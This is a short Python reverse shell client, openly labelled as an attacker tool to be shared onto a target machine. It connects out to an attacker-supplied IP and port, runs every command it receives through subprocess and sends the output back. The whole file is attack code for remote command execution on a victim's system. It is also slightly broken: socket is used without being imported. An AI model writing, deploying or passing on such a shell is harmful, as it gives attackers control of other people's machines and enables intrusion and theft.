# Revshell Client
# share this file to the target if you are attacker
import os,subprocess
ip = '' # Enter attacker ip
port = 1337 # Enter attacker port
c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.connect((ip, port))
while True:
  path = os.getcwd()
  c.send(path.encode('utf-8'))
  cmd = c.recv(2048).decode("utf-8")
  if 'cd' in cmd:
    cut = cmd.split(" ")
    os.chdir(os.getcwd() + "//" +cut[1])
    path = os.getcwd()
    c.send(path.encode('utf-8'))
  else:
     op = subprocess.getoutput(cmd)
     c.send(op.encode("utf-8"))
